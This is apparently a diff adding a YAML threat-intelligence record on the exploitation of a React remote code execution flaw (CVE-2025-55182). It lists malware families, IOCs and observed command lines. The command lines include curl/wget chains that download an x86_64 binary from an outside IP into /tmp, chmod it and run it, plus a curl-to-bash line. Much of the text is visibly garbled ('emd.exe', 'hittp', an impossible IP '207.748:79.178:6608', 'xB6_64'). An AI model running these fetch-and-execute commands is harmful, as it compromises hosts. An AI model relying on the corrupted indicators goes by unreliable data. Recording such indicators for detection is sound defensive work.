@@ -1,0 +1,50 @@
+description: Active exploitation of React remote code execution vulnerability (CVE-2025-55182)
+  leading to various malware deployments and social engineering techniques like ClickFix.
+malware_families:
+- cryptominers
+- Linux backdoor (PeerBlight)
+- tunneling tools
+- Go-based implants
+- Kaiji botnet variant
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - C:\\Windows\\system32\\cmd.exe /d /s / "({cur] -sLhttp://207.748:79.178:6608/sys5h
+    [ bash\" 41E8
+  - C:\\Windows\\system32\\emd.exe
+  - C:\\Windows\\system32\\cmd.exe /d /s / \"(fcurl -sLhittp://45.32.158.54/5e51ff54626ef7/x86_64
+    -0 /tmp/xB6_64;chmod 777TIp/x86_64;/tmp/xB6_64) | | (wget http://45.32.158.54/5e51aff54626ef7f/x86_64
+    -0Ttmp/x86_64;chmod 777 /tmp/x86_64;/tmp/xB6_64)\"
+  - C:\\Windows\\system32\\cmd.exe /d /s / \"echo S@1%271))\"
+  - C:\\Windows\\system32\\cmd.exe /d /s / \"echo $(41%271))\"
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - cmd.exe, http://207.748:79.178:6608/sys5h
+  - emd.exe, http://45.32.158.54/5e51ff54626ef7/x86_64
+  - cmd.exe, http://45.32.158.54/5e51aff54626ef7f/x86_64
+  file_activity:
+  - /tmp/xB6_64
+  persistence: []
+  process_relations: []
+CVEs:
+- CVE-2025-55182
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 207.748:79.178:6608
+  - 45.32.158.54
+  domains: []
+  urls:
+  - http://207.748:79.178:6608/sys5h
+  - http://45.32.158.54/5e51ff54626ef7/x86_64
+authors:
+- Chris Henderson
+- Brian Milbier
+reference: https://www.huntress.com/blog/holiday-security-tips-for-family-friends
+date_of_publication: December 27, 2025
+file_creation_date: December 27, 2025
